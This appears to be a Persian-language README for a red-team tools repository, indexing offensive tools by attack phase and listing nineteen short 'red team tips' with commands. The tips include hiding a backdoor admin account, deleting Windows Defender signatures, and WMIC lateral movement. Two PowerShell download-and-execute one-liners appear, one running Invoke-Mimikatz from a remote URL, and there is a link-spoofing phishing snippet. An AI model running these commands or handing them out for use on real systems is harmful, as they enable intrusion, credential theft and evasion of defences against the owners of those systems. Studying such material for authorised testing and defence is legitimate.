# Xaoc_red_road_tools
Persian repository for redteamers tools 

## ⚠️ Disclaimer

> This guide is for educational and research purposes only. Do **not** use any payloads or techniques on systems you do not own or have explicit permission to test. Use responsibly!

# RedTeam-Tools

<p align="center">
<img src="./Public/redteamtools.png" height="300">
</p>

این مخزن گیت‌هاب شامل مجموعه‌ای از **۱۵۰+** **ابزار** و **منابع** است که می‌توانند برای **فعالیت‌های رد تیمینگ** مفید باشند.

برخی از این ابزارها به‌طور خاص برای رد تیمینگ طراحی شده‌اند، در حالی که برخی دیگر کاربرد عمومی‌تری دارند و می‌توان آن‌ها را برای استفاده در زمینهٔ رد تیمینگ تطبیق داد.

> 🔗 Blue team soon!

> **Warning** 
> 
> *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*

> **هشدار**
>
> *مطالب موجود در این مخزن صرفاً برای اهداف آموزشی و اطلاع‌رسانی تهیه شده‌اند. استفاده از آن‌ها در فعالیت‌های غیرقانونی مد نظر نیست.*

> **توجه**
>
> *برای پنهان کردن سرفصل‌های لیست ابزارها از فلش استفاده کنید.*
>
> *روی 🔙 کلیک کنید تا به لیست برگردید.*

# Tool List

<details open dir="ltr">
    <summary><b>نکات رد تیم</b> ۱۹ نکته</summary>
    <ul>
        <ul>
        	<li><b><a href="#improved-html-smuggling-with-mouse-move-eventlistener">بهبود HTML Smuggling با رویداد mouse move</a></b><i> @pr0xylife</i></li>
        	<li><b><a href="#google-translate-for-phishing">استفاده از Google Translate برای فیشینگ</a></b><i> @malmoeb</i></li>
            <li><b><a href="#hiding-the-local-admin-account">مخفی کردن حساب ادمین محلی</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#cripple-windows-defender-by-deleting-signatures">از کار انداختن Windows Defender با حذف امضاها</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#enable-multiple-rdp-sessions-per-user">فعال‌سازی چند جلسه RDP برای یک کاربر</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#sysinternals-psexecexe-local-alternative">جایگزین محلی Sysinternals PsExec.exe</a></b><i> @GuhnooPlusLinux</i></li>
            <li><b><a href="#live-off-the-land-port-scanner">پویشگر پورت بدون ابزار اضافی (Live off the land)</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#proxy-aware-powershell-downloadstring">دانلود رشته در PowerShell با پشتیبانی از پراکسی</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#looking-for-internal-endpoints-in-browser-bookmarks">جستجوی آدرس‌های داخلی در بوکمارک‌های مرورگر</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#query-dns-records-for-enumeration">پرس‌وجوی رکوردهای DNS برای شناسایی</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#unquoted-service-paths-without-powerup">مسیر سرویس بدون کوتیشن بدون استفاده از PowerUp</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#bypass-a-disabled-command-prompt-with-k">دور زدن CMD غیرفعال با /k</a></b><i> Martin Sohn Christensen</i></li>
            <li><b><a href="#stop-windows-defender-deleting-mimikatzexe">جلوگیری از حذف mimikatz.exe توسط Windows Defender</a></b><i> @GuhnooPlusLinux</i></li>
            <li><b><a href="#check-if-you-are-in-a-virtual-machine">بررسی اجرای سیستم در ماشین مجازی</a></b><i> @dmcxblue</i></li>
            <li><b><a href="#enumerate-applocker-rules">شمارش قوانین AppLocker</a></b><i> @Alh4zr3d</i></li>
            <li><b><a href="#cmd-shortcut-with-6-pixels-via-mspaint">میانبر CMD با ۶ پیکسل از طریق MSPaint</a></b><i> PenTestPartners</i></li>
            <li><b><a href="#link-spoofing-with-preventdefault-javascript-method">جعل لینک با متد JavaScript PreventDefault</a></b></li>
            <li><b><a href="#check-smb-firewall-rules-with-responder">بررسی قوانین فایروال SMB با Responder</a></b><i> @malmoeb</i></li>
            <li><b><a href="#disable-av-with-sysinternals-pssuspend">غیرفعال‌سازی آنتی‌ویروس با SysInternals PsSuspend</a></b><i> @0gtweet</i></li>
        </ul>
    </ul>        
</details>

<details open>
    <summary><b>شناسایی (Reconnaissance)</b> ۲۴ ابزار</summary>
    <ul>
        <ul>
            <li><b><a href="#spiderfoot">spiderfoot</a></b><i> OSINT خودکار و نقشه‌برداری سطح حمله</i></li>
            <li><b><a href="#reconftw">reconftw</a></b><i> ابزار خودکار شناسایی زیردامنه و آسیب‌پذیری</i></li>
            <li><b><a href="#subzy">subzy</a></b><i> بررسی آسیب‌پذیری تصاحب زیردامنه</i></li>
            <li><b><a href="#smtp-user-enum">smtp-user-enum</a></b><i> شناسایی کاربران SMTP</i></li>
            <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> اسکرین‌شات‌گیری خودکار از دامنه‌ها</i></li>
            <li><b><a href="#jsendpoints">jsendpoints</a></b><i> استخراج لینک‌های DOM صفحه</i></li>
            <li><b><a href="#nuclei">nuclei</a></b><i> اسکنر آسیب‌پذیری</i></li>
            <li><b><a href="#certsniff">certSniff</a></b><i> شناسایی کلمات کلیدی در لاگ شفافیت گواهینامه</i></li>
            <li><b><a href="#gobuster">gobuster</a></b><i> بروت‌فورس مسیرهای وب‌سایت</i></li>
            <li><b><a href="#feroxbuster">feroxbuster</a></b><i> ابزار کشف محتوای سریع نوشته‌شده با Rust</i></li>
            <li><b><a href="#cloudbrute">CloudBrute</a></b><i> بروت‌فورس زیرساخت ابری</i></li>
            <li><b><a href="#dnsrecon">dnsrecon</a></b><i> شمارش رکوردهای DNS</i></li>
            <li><b><a href="#shodanio">Shodan.io</a></b><i> پایگاه دانش سیستم‌های در معرض اینترنت</i></li>
            <li><b><a href="#aort">AORT (ابزار شناسایی همه‌کاره)</a></b><i> شمارش زیردامنه‌ها</i></li>
            <li><b><a href="#spoofcheck">spoofcheck</a></b><i> بررسی رکورد SPF/DMARC</i></li>
            <li><b><a href="#awsbucketdump">AWSBucketDump</a></b><i> شناسایی باکت‌های S3</i></li>
            <li><b><a href="#githarvester">GitHarvester</a></b><i> جستجوی اعتبارنامه در GitHub</i></li>
            <li><b><a href="#trufflehog">truffleHog</a></b><i> اسکنر اعتبارنامه GitHub</i></li>
            <li><b><a href="#dismap">Dismap</a></b><i> کشف/شناسایی دارایی</i></li>
            <li><b><a href="#enum4linux">enum4linux</a></b><i> شمارش Windows/Samba</i></li>
            <li><b><a href="#skanuvaty">skanuvaty</a></b><i> اسکنر سریع DNS/شبکه/پورت</i></li>
            <li><b><a href="#metabigor">Metabigor</a></b><i> ابزار OSINT بدون نیاز به API</i></li>
            <li><b><a href="#gitrob">Gitrob</a></b><i> اسکن اطلاعات حساس GitHub</i></li>
            <li><b><a href="#gowitness">gowitness</a></b><i> ابزار اسکرین‌شات وب با Chrome Headless</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>توسعه منابع (Resource Development)</b> ۱۲ ابزار</summary>
    <ul>
        <ul>
            <li><b><a href="#remoteinjector">remoteinjector</a></b><i> تزریق لینک قالب از راه دور به سند Word</i></li>
            <li><b><a href="#chimera">Chimera</a></b><i> مبهم‌سازی PowerShell</i></li>
            <li><b><a href="#msfvenom">msfvenom</a></b><i> ساخت Payload</i></li>
            <li><b><a href="#shellter">Shellter</a></b><i> تزریق پویا کد مخرب</i></li>
            <li><b><a href="#freeze">Freeze</a></b><i> ساخت Payload (دور زدن EDR)</i></li>
            <li><b><a href="#wordsteal">WordSteal</a></b><i> سرقت هش‌های NTML با Microsoft Word</i></li>
            <li><b><a href="#ntapi-undocumented-functions">توابع مستندنشده NTAPI</a></b><i> کرنل Windows NT، API بومی و درایورها</i></li>
            <li><b><a href="#kernel-callback-functions">توابع Callback کرنل</a></b><i> APIهای مستندنشده ویندوز</i></li>
            <li><b><a href="#offensivevba">OffensiveVBA</a></b><i> اجرای کد ماکرو Office و تکنیک‌های دور زدن</i></li>
            <li><b><a href="#wsh">WSH</a></b><i> Payload WSH</i></li>
            <li><b><a href="#hta">HTA</a></b><i> Payload HTA</i></li>
            <li><b><a href="#vba">VBA</a></b><i> Payload VBA</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>دسترسی اولیه (Initial Access)</b> ۱۰ ابزار</summary>
    <ul>
        <ul>
            <li><b><a href="#credmaster">CredMaster</a></b><i> ابزار Password Spraying CredKing</i></li>
            <li><b><a href="#trevorspray">TREVORspray</a></b><i> Password Spraying چندریسمانی</i></li>
            <li><b><a href="#evilqr">evilqr</a></b><i> PoC فیشینگ QRLJacking</i></li>
            <li><b><a href="#cupp">CUPP</a></b><i> پروفایل‌ساز رمزهای رایج کاربران</i></li>
            <li><b><a href="#bash-bunny">Bash Bunny</a></b><i> ابزار حمله USB</i></li>
            <li><b><a href="#evilgophish">EvilGoPhish</a></b><i> چارچوب کمپین فیشینگ</i></li>
            <li><b><a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a></b><i> چارچوب کمپین فیشینگ</i></li>
            <li><b><a href="#hydra">Hydra</a></b><i> ابزار بروت‌فورس</i></li>
            <li><b><a href="#squarephish">SquarePhish</a></b><i> چارچوب فیشینگ OAuth/QR</i></li>
            <li><b><a href="#king-phisher">King Phisher</a></b><i> چارچوب کمپین فیشینگ</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>اجرا (Execution)</b> ۱۳ ابزار</summary>
    <ul>
        <ul>
            <li><b><a href="#responder">Responder</a></b><i> مسموم‌ساز LLMNR، NBT-NS و MDNS</i></li>
            <li><b><a href="#secretsdump">secretsdump</a></b><i> دامپ هش از راه دور</i></li>
            <li><b><a href="#evil-winrm">evil-winrm</a></b><i> شل WinRM</i></li>
            <li><b><a href="#donut">Donut</a></b><i> اجرای درون‌حافظه‌ای .NET</i></li>
            <li><b><a href="#macro_pack">Macro_pack</a></b><i> مبهم‌سازی ماکرو</i></li>
            <li><b><a href="#powersploit">PowerSploit</a></b><i> مجموعه اسکریپت‌های PowerShell</i></li>
            <li><b><a href="#rubeus">Rubeus</a></b><i> ابزار هک Active Directory</i></li>
            <li><b><a href="#sharpup">SharpUp</a></b><i> شناسایی آسیب‌پذیری ویندوز</i></li>
            <li><b><a href="#sqlrecon">SQLRecon</a></b><i> جعبه‌ابزار تهاجمی MS-SQL</i></li>
            <li><b><a href="#ultimateapplockerbypasslist">UltimateAppLockerByPassList</a></b><i> تکنیک‌های متداول دور زدن AppLocker</i></li>
            <li><b><a href="#starfighters">StarFighters</a></b><i> لانچر Empire مبتنی بر JavaScript و VBScript</i></li>
            <li><b><a href="#demiguise">demiguise</a></b><i> ابزار رمزگذاری HTA</i></li>
            <li><b><a href="#powerzure">PowerZure</a></b><i> چارچوب PowerShell برای ارزیابی امنیت Azure</i></li>
        </ul>
    </ul>
</details>
<details open>
    <summary><b>ماندگاری (Persistence)</b> - ۴ ابزار</summary>
    <ul>
        <li><b><a href="#impacket">Impacket</a></b><i> مجموعه اسکریپت‌های پایتون</i></li>
        <li><b><a href="#empire">Empire</a></b><i> فریم‌ورک پس از بهره‌برداری</i></li>
        <li><b><a href="#sharpersist">SharPersist</a></b><i> جعبه‌ابزار ماندگاری در ویندوز</i></li>
        <li><b><a href="#ligolo-ng">ligolo-ng</a></b><i> ابزار تونل‌زنی با رابط TUN</i></li>
    </ul>
</details>

<details open>
    <summary><b>ارتقاء سطح دسترسی (Privilege Escalation)</b> - ۱۱ ابزار</summary>
    <ul>
        <li><b><a href="#crassus">Crassus</a></b><i> ابزار شناسایی ارتقاء دسترسی ویندوز</i></li>
        <li><b><a href="#linpeas">LinPEAS</a></b><i> ارتقاء دسترسی در لینوکس</i></li>
        <li><b><a href="#winpeas">WinPEAS</a></b><i> ارتقاء دسترسی در ویندوز</i></li>
        <li><b><a href="#linux-smart-enumeration">linux-smart-enumeration</a></b><i> ارتقاء دسترسی لینوکس</i></li>
        <li><b><a href="#certify">Certify</a></b><i> ارتقاء دسترسی Active Directory</i></li>
        <li><b><a href="#get-gpppassword">Get-GPPPassword</a></b><i> استخراج رمزهای ویندوز</i></li>
        <li><b><a href="#sherlock">Sherlock</a></b><i> ابزار پاورشل برای ارتقاء دسترسی ویندوز</i></li>
        <li><b><a href="#watson">Watson</a></b><i> ابزار ارتقاء دسترسی ویندوز</i></li>
        <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> ابزار DLL Hijacking</i></li>
        <li><b><a href="#adfsdump">ADFSDump</a></b><i> ابزار Dump کردن AD FS</i></li> 
        <li><b><a href="#beroot">BeRoot</a></b><i> پروژه چندسیستمی ارتقاء دسترسی</i></li>
    </ul>
</details>

<details open>
    <summary><b>گریز از دفاع (Defense Evasion)</b> - ۸ ابزار</summary>
    <ul>
        <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> مبهم‌ساز اسکریپت</i></li>
        <li><b><a href="#veil">Veil</a></b><i> مبهم‌سازی Payload متاسپلویت</i></li>
        <li><b><a href="#sharpblock">SharpBlock</a></b><i> دور زدن EDR با جلوگیری از اجرای Entry Point</i></li>
        <li><b><a href="#alcatraz">Alcatraz</a></b><i> مبهم‌ساز گرافیکی باینری x64</i></li>
        <li><b><a href="#mangle">Mangle</a></b><i> دستکاری فایل اجرایی کامپایل شده</i></li>
        <li><b><a href="#amsi-fail">AMSI Fail</a></b><i> اسکریپت‌های پاورشل برای از کار انداختن AMSI</i></li>
        <li><b><a href="#scarecrow">ScareCrow</a></b><i> ساخت Payload با هدف دور زدن EDR</i></li>
        <li><b><a href="#moonwalk">moonwalk</a></b><i> حذف لاگ و زمان‌بندی فایل‌ها در لینوکس</i></li>
    </ul>
</details>

<details open>
    <summary><b>دسترسی به اعتبارنامه‌ها (Credential Access)</b> - ۱۱ ابزار</summary>
    <ul>
        <li><b><a href="#mimikatz">Mimikatz</a></b><i> استخراج اعتبارنامه‌های ویندوز</i></li>
        <li><b><a href="#lazagne">LaZagne</a></b><i> استخراج رمزهای ذخیره‌شده محلی</i></li>
        <li><b><a href="#hashcat">hashcat</a></b><i> کرک هش رمز عبور</i></li>
        <li><b><a href="#john-the-ripper">John the Ripper</a></b><i> کرک هش رمز عبور</i></li>
        <li><b><a href="#scomdecrypt">SCOMDecrypt</a></b><i> ابزار رمزگشایی اعتبارنامه‌های SCOM</i></li>
        <li><b><a href="#nanodump">nanodump</a></b><i> ایجاد Minidump از پروسه LSASS</i></li>
        <li><b><a href="#eviltree">eviltree</a></b><i> جستجوی اعتبارنامه‌ها در ساختار درختی</i></li>
        <li><b><a href="#seeyoucm-thief">SeeYouCM-Thief</a></b><i> استخراج فایل‌های پیکربندی تلفن‌های Cisco</i></li>
        <li><b><a href="#mailsniper">MailSniper</a></b><i> جستجوگر ایمیل Microsoft Exchange</i></li>
        <li><b><a href="#sharpchromium">SharpChromium</a></b><i> استخراج کوکی‌ها، تاریخچه و رمزهای ذخیره‌شده مرورگرهای Chromium</i></li>
        <li><b><a href="#dploot">dploot</a></b><i> استخراج DPAPI از راه دور با پایتون</i></li>
    </ul>
</details>

Red Team Tips
====================

*یادگیری از تیم‌های قرمز با مجموعه‌ای از نکات تخصصی. این نکات شامل تاکتیک‌ها، ابزارها و روش‌هایی هستند که مهارت‌های تست نفوذ و تیم قرمزی شما را ارتقا می‌دهند.*


## Red Team Tips

*یادگیری از تیم‌های قرمز با مجموعه‌ای از نکات تخصصی. این نکات شامل تاکتیک‌ها، ابزارها و روش‌هایی هستند که مهارت‌های تست نفوذ و تیم قرمزی شما را ارتقا می‌دهند.*


### [🔙](#tool-list)Improved HTML smuggling with mouse move eventlistener

*اسمگلینگ HTML بهبود یافته با لیسنر حرکت ماوس*<br>
**توضیح:** *«Qakbot یک EventListener برای حرکت ماوس به پیوست HTML Smuggling اضافه کرده تا در محیط‌های سندباکس از اجرا جلوگیری کند. فایل ZIP تا وقتی ماوس حرکت نکند، محتوا را استخراج نمی‌کند.»*<br>
**اعتبار:** [@pr0xylife](https://x.com/pr0xylife)<br>
**لینک:** [Twitter](https://x.com/pr0xylife/status/1598410732516802563)<br>


### [🔙](#tool-list)Google translate for phishing

*استفاده از Google Translate برای فیشینگ*<br>
**توضیح:** *صفحه فیشینگ موفق که اطلاعات کاربری را از طریق قابلیت نمایش صفحه Google Translate پروکسی می‌کند.*<br>
**اعتبار:** [@malmoeb](https://x.com/malmoeb)<br>
**لینک:** [Twitter](https://x.com/malmoeb/status/1671106885590630400)<br>


### [🔙](#tool-list)Hiding the local admin account

*پنهان کردن حساب ادمین محلی*<br>

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v alh4zr3d /d 0 /f
```

**توضیح:** *«ایجاد حساب کاربری هنگام فرار از دید تیم آبی ریسک دارد، اما اگر نیاز به ساخت یک ادمین محلی دارید، با کمی جادوی رجیستری می‌توانید آن را پنهان کنید.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1612913838999113728)<br>


### [🔙](#tool-list)Cripple windows defender by deleting signatures

*از کار انداختن Windows Defender با حذف امضاها*<br>

```bash
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

**توضیح:** *«اگر Windows Defender برایتان دردسرساز است، به جای غیرفعال کردن کاملش (که باعث هشدار می‌شود)، می‌توانید با حذف امضاها آن را بی‌اثر کنید.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1611005101262389250)<br>


### [🔙](#tool-list)Enable multiple RDP sessions per user

*فعال کردن چند نشست RDP برای هر کاربر*<br>

```bash
reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f
```

**توضیح:** *«گاهی می‌خواهید با RDP وارد یک سیستم شوید اما کاربر شما قبلاً جلسه فعال دارد. با این تنظیم می‌توانید چند نشست همزمان برای یک کاربر فعال کنید.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1609954528425558016)<br>


### [🔙](#tool-list)Sysinternals PsExec.exe local alternative

*جایگزین محلی برای PsExec.exe از Sysinternals*<br>

```bash
wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.exe /c " command "
```

**توضیح:** *«خسته شده‌اید از اینکه باید PsExec.exe را برای جابجایی جانبی آپلود کنید؟ ویندوز یک جایگزین داخلی و آماده دارد.»*<br>
**اعتبار:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)<br>
**لینک:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1607473627922063360)<br>


### [🔙](#tool-list)Live off the land port scanner

*اسکن پورت با PowerShell بدون ابزار اضافی*<br>

```bash
0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) "Port $_ open"} 2>$null
```

**توضیح:** *«هر وقت ممکن بود از ابزارهای داخلی سیستم استفاده کنید تا نیازی به آپلود ابزار نباشد. این نمونه یک اسکنر پورت ساده در PowerShell است.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1605060950339588096)<br>


### [🔙](#tool-list)Proxy aware PowerShell DownloadString

*دانلود رشته PowerShell با پشتیبانی از پروکسی*<br>

```bash
$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
```

**توضیح:** *«بسیاری از سازمان‌ها از وب‌پروکسی استفاده می‌کنند. دانلودر پیش‌فرض PowerShell از پروکسی پشتیبانی نمی‌کند، این نسخه را امتحان کنید.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1596192664398966785)<br>


### [🔙](#tool-list)Looking for internal endpoints in browser bookmarks

*یافتن نقاط پایانی داخلی در بوکمارک مرورگر*<br>

```bash
type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
```

**توضیح:** *«شاید باور نکنید ولی فقط از روی بوکمارک‌های مرورگر کاربر می‌توان نقاط پایانی داخلی و منابع حساس را شناسایی کرد.»*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)<br>

### [🔙](#tool-list)Query DNS records for enumeration  
*درخواست رکوردهای DNS برای شمارش*<br>  

```bash
Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
```  

**توضیح:** *'شمارش ۹۵٪ بازی است. با این حال، اجرای حجم زیادی از اسکن‌ها برای ارزیابی محیط، بسیار پرسر و صدا است. چرا فقط از سرور DC/DNS نخواهیم که تمام رکوردهای DNS را در اختیارمان بگذارد؟'*<br>  
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>  
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1587132627823181824)<br>

### [🔙](#tool-list)Unquoted service paths without PowerUp  
*یافتن مسیرهای سرویس بدون کوتیشن (Unquoted) بدون استفاده از PowerUp*<br>  

```bash
Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```  

**توضیح:** *'یافتن مسیرهای سرویس بدون کوتیشن (Unquoted) بدون استفاده از PowerUp'* <br> 
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)  <br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1579254955554136064) <br> 

### [🔙](#tool-list)Bypass a disabled command prompt with /k  
*دور زدن خط فرمان غیرفعال شده با استفاده از /k*  <br>

```bash
# Win+R (برای باز کردن کادر Run)
cmd.exe /k "whoami"
```  

**توضیح:** *'این خط فرمان توسط مدیر سیستم شما غیرفعال شده است...' این پیام معمولاً در محیط‌هایی مانند کیوسک‌های عمومی دیده می‌شود. یک راه حل سریع و hacky، استفاده از سوئیچ /k از طریق کادر Run ویندوز است. این دستور، دستور شما را اجرا می‌کند و سپس پیام محدودیت را نشان می‌دهد و در نتیجه اجرای دستور را ممکن می‌سازد.*  <br>
**اعتبار:** Martin Sohn Christensen  <br>
**لینک:** [Blog](https://improsec.com/tech-blog/the-command-prompt-has-been-disabled-by-your-administrator-press-any-key-to-continue-or-use-these-weird-tricks-to-bypass-admins-will-hate-you)  <br>

### [🔙](#tool-list)Stop windows defender deleting mimikatz.exe  
*جلوگیری از حذف فایل mimikatz.exe توسط Windows Defender* <br>

```bash
(new-object net.webclient).downloadstring('https://raw.githubusercontent[.]com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')|IEX;inv
```  

**توضیح:** *'از پاک شدن mimikatz.exe توسط Windows Defender خسته شده‌اید؟ این روش را امتحان کنید.'*  <br>
**اعتبار:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)  <br>
**لینک:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1605629049660809216)  <br>

### [🔙](#tool-list)Looking for internal endpoints in browser bookmarks  
*یافتن نقاط پایانی داخلی در بوکمارک مرورگر* <br>

```bash
type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
```  

**توضیح:** *'شاید باور نکنید ولی فقط از روی بوکمارک‌های مرورگر کاربر می‌توان نقاط پایانی داخلی و منابع حساس را شناسایی کرد.'*  <br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)  <br>
**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)<br>

### [🔙](#tool-list)Check if you are in a virtual machine
*بررسی اینکه آیا در یک ماشین مجازی هستید یا خیر*<br>

```bash
reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
```

**توضیح:** *'می‌خواهید بدانید که آیا در یک ماشین مجازی هستید؟ کلیدهای رجیستری را جستجو کنید و بفهمید!!! اگر نتیجه‌ای نمایش داده شد، یعنی شما در یک ماشین مجازی هستید.'*<br>
**اعتبار:** [@dmcxblue](https://twitter.com/dmcxblue)<br>
**لینک:** [Twitter](https://twitter.com/dmcxblue/status/1366779034672136194)<br>

### [🔙](#tool-list)Enumerate AppLocker rules
*شمارش قوانین AppLocker*<br>

```
(Get-AppLockerPolicy -Local).RuleCollections

Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```

**توضیح:** *'AppLocker می‌تواند دردسرساز باشد. برای درک میزان این دردسر، قوانین آن را شمارش کنید.'*<br>
**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
**لینک:** [Twitter](https://twitter.com/alh4zr3d/status/1614706476412698624)<br>

### [🔙](#tool-list)CMD shortcut with 6 pixels via mspaint
*دسترسی به CMD با استفاده از یک فایل 6 پیکسلی در MSPaint*<br>

![image](https://user-images.githubusercontent.com/100603074/223849011-24db49d7-37b0-4dad-a7a6-db046f6cb7da.png)<br>

1. برنامه MSPaint.exe را باز کنید و اندازه بوم را روی عرض: 6 و ارتفاع: 1 پیکسل تنظیم کنید.
2. برای راحت‌تر انجام دادن مراحل بعدی، زوم کنید.
3. با استفاده از ابزار انتخاب رنگ، مقادیر پیکسل‌ها را به ترتیب از چپ به راست به صورت زیر تنظیم کنید:
    - پیکسل اول: قرمز: 10, سبز: 0, آبی: 0
    - پیکسل دوم: قرمز: 13, سبز: 10, آبی: 13
    - پیکسل سوم: قرمز: 100, سبز: 109, آبی: 99
    - پیکسل چهارم: قرمز: 120, سبز: 101, آبی: 46
    - پیکسل پنجم: قرمز: 0, سبز: 0, آبی: 101
    - پیکسل ششم: قرمز: 0, سبز: 0, آبی: 0
4. فایل را با فرمت **24-bit Bitmap (*.bmp;*.dib)** ذخیره کنید.
5. پسوند فایل را از bmp به bat تغییر دهید و آن را اجرا کنید.

**توضیح:** *'یک روش غیرمعمول اما مؤثر برای به دست آوردن یک شل (دسترسی خط فرمان) با ایجاد یک میانبر به cmd.exe با کشیدن رنگ‌های خاص در Microsoft Paint. به دلیل الگوریتم رمزگذاری مورد استفاده برای نوشتن فایل‌های BMP، امکان تعیین داده‌های ASCII نوشته شده در یک فایل با انتخاب دقیق مقادیر RGB خاص وجود دارد.'*<br>
**اعتبار:** [PenTestPartners](https://www.pentestpartners.com/)<br>
**لینک:** [Blog](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#gainingacommandshell)<br>

### [🔙](#tool-list)Link spoofing with PreventDefault JavaScript method
*جعل لینک با استفاده از متد PreventDefault در جاوااسکریپت*<br>

![image](https://user-images.githubusercontent.com/100603074/223849419-c65fec83-ca1c-4a20-ac06-ec2de537a748.png)

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>PreventDefault Example</title>
  </head>
  <body>
    <a href="https://google.com" onclick="event.preventDefault(); window.location.href = 'https://bing.com';">Go to Google</a>
  </body>
</html>
```

**توضیح:** *مشاهده شده که عوامل تهدید از این تکنیک برای فریب قربانیان جهت کلیک روی لینک‌های جعلی دانلود بدافزار در صفحه استفاده می‌کنند. با استفاده از متد `PreventDefault` در جاوااسکریپت، می‌توانید لینکی را جعل کنید که در هاور (hover) لینک معتبر `google.com` را نمایش می‌دهد، اما پس از کلیک، قربانی به لینک مخرب شما (`bing.com`) هدایت می‌شود. این روش برای وادار کردن قربانیان به دانلود payloadها از طریق یک سایت تحت کنترل عالی است.*<br>
**لینک:** [مستندات PreventDefault](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)<br>

### [🔙](#tool-list)Check SMB firewall rules with Responder
*بررسی قوانین فایروال برای SMB با استفاده از Responder*

![image](https://user-images.githubusercontent.com/100603074/229650380-b651cfc4-896f-4429-b7b4-54d1241a5b39.png)

```powershell
Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
```

**توضیح:** *«هنگامی که یک ارزیابی نفوذ (Compromise Assessment) انجام می‌دهم، اغلب از مشتری می‌پرسم که آیا می‌توانم یک بررسی سریع نهایی انجام دهم: `Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"`. اگر Responder بتواند هش را捕获 (capture) کند، به این معنی است که فایروال اجازه اتصالات خروجی SMB را می‌دهد.»*<br>
**اعتبار:** [@malmoeb](https://twitter.com/malmoeb)<br>
**لینک:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)<br>

### [🔙](#tool-list)Disable AV with SysInternals PsSuspend
*غیرفعال کردن آنتی‌ویروس با استفاده از PsSuspend از SysInternals*<br>

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4519f5ad-c177-4550-b9af-238fa73ad66e)

**توضیح:** *با استفاده از ابزار Microsoft Sysinternals به نام PsSuspend.exe می‌توان برخی از فایل‌های اجرایی سرویس آنتی‌ویروس را به حالت تعلیق (suspend) درآورد. این ابزار امضا شده توسط مایکروسافت می‌تواند PID یا نام یک سرویس در حال اجرا را دریافت کند و آن فرآیند را از طریق Windows API به نام `NtSuspendProcess` متوقف کند.*<br>
**پست وبلاگ مرتبط:** [دور زدن آنتی‌ویروس از طریق تعلیق فرآیند با PsSuspend.exe](https://medium.com/@a-poc/process-suspension-with-pssuspend-exe-0cdf5d16a3b7)<br>
**لینک:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)<br>